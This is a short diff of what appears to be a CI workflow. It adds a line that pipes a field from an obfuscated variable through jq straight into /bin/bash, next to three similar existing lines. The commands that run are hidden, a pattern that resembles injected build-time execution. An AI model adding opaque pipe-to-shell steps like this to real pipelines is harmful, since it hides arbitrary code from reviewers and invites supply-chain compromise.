@@ -21,6 +21,7 @@ jobs:
           echo $xoly9 | jq -r .nxvd21961 | /bin/bash
           echo $ryngq677 | jq -r .zn8322 | /bin/bash
           echo $lgpl75 | jq -r .pqcuq28047 | /bin/bash
+          echo $tcq1322 | jq -r .z7 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
